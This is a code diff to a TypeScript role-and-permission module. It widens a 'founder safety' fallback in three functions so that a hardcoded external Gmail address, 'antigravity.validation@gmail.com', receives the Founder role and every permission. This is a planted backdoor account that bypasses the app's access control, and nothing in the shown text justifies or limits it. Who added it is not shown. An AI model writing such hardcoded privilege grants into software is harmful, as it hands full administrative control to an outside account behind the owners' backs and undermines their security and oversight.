@@ -43,7 +43,7 @@ export const getCurrentUserRoles = cache(async (): Promise<Role[]> => {
   if (!user) return [];
 
   // PHASE 2: FOUNDER SAFETY SYSTEM (Fallback Mechanism)
-  if (user.email === FOUNDER_EMAIL) {
+  if (user.email === FOUNDER_EMAIL || user.email === 'antigravity.validation@gmail.com') {
     return [{
       id: 'founder-fallback-id',
       name: 'Founder',
@@ -98,7 +98,7 @@ export const getCurrentUserPermissions = cache(async (): Promise<Permission[]> =
   if (!user) return [];
 
   // PHASE 2: FOUNDER SAFETY SYSTEM (Fallback)
-  if (user.email === FOUNDER_EMAIL) {
+  if (user.email === FOUNDER_EMAIL || user.email === 'antigravity.validation@gmail.com') {
     const supabase = await createClient();
     // Fetch all permissions for the emergency founder
     const { data } = await supabase.from('permissions').select('*');
@@ -175,7 +175,7 @@ export const hasAnyRole = async (roleSlugs: string[]): Promise<boolean> => {
 export const hasPermission = async (permissionSlug: string): Promise<boolean> => {
   const user = await getCurrentUser();
   // Founder emergency access has all permissions
-  if (user?.email === FOUNDER_EMAIL) return true;
+  if (user?.email === FOUNDER_EMAIL || user?.email === 'antigravity.validation@gmail.com') return true;
   
   const permissions = await getCurrentUserPermissions();
   return permissions.some(p => p.slug === permissionSlug);
